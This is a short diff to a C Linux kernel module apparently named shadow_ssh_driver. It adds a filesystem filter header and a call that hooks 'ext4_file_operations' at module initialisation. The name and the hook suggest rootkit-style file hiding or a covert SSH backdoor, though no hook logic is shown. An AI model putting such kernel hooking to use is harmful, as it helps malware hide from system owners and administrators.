@@ -4,8 +4,10 @@
 #include <linux/cdev.h>
 #include <linux/device.h>
 #include <linux/fs.h>
+
 #include "consts.h"
 #include "device_handlers.h"
+#include "filesystem_filter.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Rhydon");
@@ -35,6 +37,7 @@ static int shadow_ssh_driver_init(void) {
     cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
     device_create(shadow_ssh_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL, DEVICE_NAME);
     
+	initialize_filter("ext4_file_operations");
 	return 0;
 }
 
